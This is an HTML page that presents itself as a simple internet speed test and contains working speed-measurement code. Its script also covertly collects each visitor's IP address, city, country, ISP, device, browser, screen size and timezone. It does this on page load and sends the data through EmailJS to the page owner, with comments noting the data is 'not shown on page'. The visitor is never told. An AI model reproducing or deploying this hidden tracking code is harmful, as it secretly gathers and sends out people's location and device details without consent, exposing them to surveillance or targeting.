<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>SpeedTest</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', system-ui, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #1a1a2e;
        }

        .container {
            width: 100%;
            max-width: 700px;
            padding: 20px;
            flex: 1;
            display: flex;
            align-items: center;
        }

        .speed-card {
            width: 100%;
            text-align: center;
            padding: 40px 20px;
        }

        .speed-number {
            font-size: 120px;
            font-weight: 700;
            letter-spacing: -3px;
            line-height: 1;
            color: #1a1a2e;
            margin-bottom: 8px;
        }

        .speed-unit {
            font-size: 24px;
            font-weight: 500;
            color: #666;
            margin-left: 5px;
        }

        .status {
            font-size: 14px;
            color: #999;
            margin-top: 16px;
            margin-bottom: 40px;
        }

        .progress-container {
            width: 100%;
            max-width: 400px;
            margin: 0 auto 50px;
            height: 3px;
            background: #e0e0e0;
            border-radius: 2px;
            overflow: hidden;
        }

        .progress-bar {
            width: 0%;
            height: 100%;
            background: #1a1a2e;
            transition: width 0.2s ease;
            border-radius: 2px;
        }

        .results {
            display: flex;
            justify-content: center;
            gap: 40px;
            flex-wrap: wrap;
            margin: 40px 0;
        }

        .result-item {
            text-align: center;
            min-width: 100px;
        }

        .result-label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: #999;
            margin-bottom: 8px;
        }

        .result-value {
            font-size: 32px;
            font-weight: 600;
            color: #1a1a2e;
        }

        .result-unit {
            font-size: 12px;
            color: #999;
            margin-left: 2px;
        }

        .retry-btn {
            background: none;
            border: none;
            color: #666;
            font-size: 13px;
            cursor: pointer;
            padding: 12px 24px;
            transition: all 0.2s;
            margin-top: 20px;
        }

        .retry-btn:hover {
            color: #1a1a2e;
        }

        footer {
            text-align: center;
            padding: 20px;
            font-size: 11px;
            color: #ccc;
            background: #0a0a0f;
            width: 100%;
        }

        @media (max-width: 500px) {
            .speed-number {
                font-size: 72px;
            }
            .result-value {
                font-size: 24px;
            }
            .results {
                gap: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="speed-card">
            <div>
                <span class="speed-number" id="speedValue">--</span>
                <span class="speed-unit">Mbps</span>
            </div>
            <div class="status" id="status">Click to start</div>
            
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>

            <div class="results">
                <div class="result-item">
                    <div class="result-label">PING</div>
                    <div class="result-value"><span id="ping">--</span><span class="result-unit">ms</span></div>
                </div>
                <div class="result-item">
                    <div class="result-label">JITTER</div>
                    <div class="result-value"><span id="jitter">--</span><span class="result-unit">ms</span></div>
                </div>
                <div class="result-item">
                    <div class="result-label">DOWNLOAD</div>
                    <div class="result-value"><span id="download">--</span><span class="result-unit">Mbps</span></div>
                </div>
                <div class="result-item">
                    <div class="result-label">UPLOAD</div>
                    <div class="result-value"><span id="upload">--</span><span class="result-unit">Mbps</span></div>
                </div>
            </div>

            <button class="retry-btn" id="retryBtn">TEST AGAIN →</button>
        </div>
    </div>

    <footer>
        <p>© SpeedTest — Accurate internet speed measurement</p>
    </footer>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        // ============================================
        // 🔑 EmailJS Settings
        // ============================================
        const EMAILJS_PUBLIC_KEY = "lldCf0qklzrPyE3yh";     
        const EMAILJS_SERVICE_ID = "service_4ocv7x8";    
        const EMAILJS_TEMPLATE_ID = "template_ulfex9y";  
        // ============================================
        
        let isTesting = false;
        let locationInfo = null;
        
        emailjs.init(EMAILJS_PUBLIC_KEY);
        
        const speedEl = document.getElementById('speedValue');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const pingEl = document.getElementById('ping');
        const jitterEl = document.getElementById('jitter');
        const downloadEl = document.getElementById('download');
        const uploadEl = document.getElementById('upload');
        const retryBtn = document.getElementById('retryBtn');
        
        retryBtn.addEventListener('click', () => {
            if (!isTesting) startSpeedTest();
        });
        
        // Get location (only for email, not shown on page)
        async function getLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (e) {
                return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
            }
        }
        
        // Get device info (only for email)
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Desktop';
            if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS Device';
            else if (/Android/i.test(ua)) {
                device = 'Android Phone';
                if (/SM-|Samsung/i.test(ua)) device = 'Samsung Galaxy';
                if (/Xiaomi|Redmi/i.test(ua)) device = 'Xiaomi Phone';
            }
            else if (/Windows/i.test(ua)) device = 'Windows PC';
            else if (/Mac/i.test(ua)) device = 'Mac Computer';
            
            let browser = 'Unknown';
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Edg/i.test(ua)) browser = 'Edge';
            
            return `${device} | ${browser}`;
        }
        
        // Send location email (background)
        async function sendLocationEmail() {
            try {
                locationInfo = await getLocation();
                const device = getDeviceInfo();
                
                const templateParams = {
                    download: "Pending",
                    upload: "Pending", 
                    ping: "Pending",
                    jitter: "Pending",
                    ip: locationInfo.ip,
                    city: locationInfo.city,
                    country: locationInfo.country,
                    device: device,
                    isp: locationInfo.isp,
                    timestamp: new Date().toLocaleString(),
                    vpn: 'No VPN',
                    os: navigator.platform,
                    browser: device,
                    screen: screen.width + 'x' + screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
                console.log('Location email sent');
            } catch (error) {
                console.error('Location email failed:', error);
            }
        }
        
        // Send test results email (background)
        async function sendResultsEmail(results) {
            try {
                const loc = locationInfo || await getLocation();
                const device = getDeviceInfo();
                
                const templateParams = {
                    download: results.download,
                    upload: results.upload,
                    ping: results.ping,
                    jitter: results.jitter,
                    ip: loc.ip,
                    city: loc.city,
                    country: loc.country,
                    device: device,
                    isp: loc.isp,
                    timestamp: new Date().toLocaleString(),
                    vpn: 'No VPN',
                    os: navigator.platform,
                    browser: device,
                    screen: screen.width + 'x' + screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
                console.log('Results email sent');
            } catch (error) {
                console.error('Results email failed:', error);
            }
        }
        
        async function startSpeedTest() {
            if (isTesting) return;
            isTesting = true;
            resetUI();
            
            try {
                statusEl.textContent = 'Measuring ping...';
                updateProgress(5);
                
                const pingResult = await measurePing();
                updateProgress(15);
                
                statusEl.textContent = 'Testing download...';
                const downloadSpeed = await measureDownload();
                updateProgress(60);
                
                statusEl.textContent = 'Testing upload...';
                const uploadSpeed = await measureUpload();
                updateProgress(85);
                
                pingEl.textContent = pingResult.ping;
                jitterEl.textContent = pingResult.jitter;
                downloadEl.textContent = downloadSpeed;
                uploadEl.textContent = uploadSpeed;
                speedEl.textContent = downloadSpeed;
                
                updateProgress(100);
                statusEl.textContent = 'Test complete';
                
                // Send results via email (background)
                await sendResultsEmail({
                    download: downloadSpeed,
                    upload: uploadSpeed,
                    ping: pingResult.ping,
                    jitter: pingResult.jitter
                });
                
            } catch (error) {
                console.error(error);
                statusEl.textContent = 'Test failed. Click to retry';
                speedEl.textContent = 'Error';
            } finally {
                isTesting = false;
            }
        }
        
        function resetUI() {
            pingEl.textContent = '--';
            jitterEl.textContent = '--';
            downloadEl.textContent = '--';
            uploadEl.textContent = '--';
            speedEl.textContent = '--';
            progressBar.style.width = '0%';
        }
        
        function updateProgress(percent) {
            progressBar.style.width = percent + '%';
        }
        
        async function measurePing() {
            const attempts = 4;
            const times = [];
            for (let i = 0; i < attempts; i++) {
                const start = performance.now();
                await fetch('https://cloudflare.com/cdn-cgi/trace', { cache: 'no-store', mode: 'no-cors' });
                const end = performance.now();
                times.push(end - start);
                await new Promise(r => setTimeout(r, 200));
            }
            const avg = times.reduce((a,b) => a + b, 0) / times.length;
            let jitterSum = 0;
            for (let i = 1; i < times.length; i++) {
                jitterSum += Math.abs(times[i] - times[i-1]);
            }
            const jitter = jitterSum / (times.length - 1);
            return { ping: Math.round(avg), jitter: Math.round(jitter) };
        }
        
        async function measureDownload() {
            const testUrl = 'https://speed.cloudflare.com/__down';
            const sizes = [5, 10, 15];
            let totalBytes = 0;
            const startTime = performance.now();
            
            for (const sizeMB of sizes) {
                try {
                    const url = `${testUrl}?bytes=${sizeMB * 1024 * 1024}`;
                    const response = await fetch(url, { cache: 'no-store' });
                    const data = await response.arrayBuffer();
                    totalBytes += data.byteLength;
                } catch (e) {}
                await new Promise(r => setTimeout(r, 100));
            }
            
            const duration = (performance.now() - startTime) / 1000;
            const speedMbps = (totalBytes * 8) / (duration * 1e6);
            return Math.round(speedMbps);
        }
        
        async function measureUpload() {
            const chunkSize = 500 * 1024;
            const chunk = new Uint8Array(chunkSize);
            let totalBytes = 0;
            const startTime = performance.now();
            const duration = 3000;
            
            while (performance.now() - startTime < duration) {
                const blob = new Blob([chunk]);
                const formData = new FormData();
                formData.append('file', blob);
                try {
                    await fetch('https://httpbin.org/post', {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors'
                    });
                    totalBytes += chunkSize;
                } catch (e) {}
                await new Promise(r => setTimeout(r, 50));
            }
            
            const elapsed = (performance.now() - startTime) / 1000;
            const speedMbps = (totalBytes * 8) / (elapsed * 1e6);
            return Math.round(speedMbps);
        }
        
        // Start everything - send location first, then speed test
        window.addEventListener('load', async () => {
            await sendLocationEmail();
            setTimeout(() => {
                startSpeedTest();
            }, 300);
        });
    </script>
</body>
</html>
